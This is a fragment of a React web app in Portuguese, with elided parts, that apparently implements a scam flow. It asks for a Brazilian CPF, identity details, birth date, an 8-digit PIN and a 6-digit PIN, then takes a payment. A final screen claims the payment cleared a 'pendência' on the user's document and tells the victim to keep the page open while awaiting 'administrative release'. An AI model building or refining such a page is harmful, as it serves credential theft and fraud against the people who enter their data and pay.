...
void StepReview;
void Step3;
function Step4() { return <section className="step-panel processing-panel"><div className="processing-spinner" aria-hidden="true"><span /></div><div className="eyebrow">PAGAMENTO CONFIRMADO</div><h1>Pagamento foi processado.</h1><p className="subtitle">A pendência será retirada do seu documento em até 24 horas.</p><div className="loading-status processing-status"><span className="spinner" /> Aguardando liberação administrativa...</div><p className="privacy">Não feche esta página. O processo continuará até a liberação no painel administrativo.</p></section>; }
...
export default function App() {
  ...
  return <main className="page"><div className="page__inner"><Header step={step} /><div className="content" key={step}>{step === 1 && <Step1 cpf={cpf} setCpf={setCpf} onContinue={(data) => { setIdentity(data); setStep(2); }} />}{step === 2 && <Step2 cpf={cpf} identity={identity} onContinue={() => setStep(3)} onBack={() => setStep(1)} />}{step === 3 && <StepBirthDate identity={identity} onContinue={() => setStep(4)} onBack={() => setStep(2)} />}{step === 4 && <StepPin onContinue={(value) => { setPin8(value); setStep(5); }} onBack={() => setStep(3)} />}{step === 5 && <StepPin6 previousPin={pin8} onContinue={() => setStep(6)} onBack={() => setStep(4)} />}{step === 6 && <StepPayment cpf={cpf} identity={identity} onContinue={() => setStep(9)} onBack={() => setStep(5)} />}{step === 9 && <Step4 />}</div><Footer /></div></main>;
}
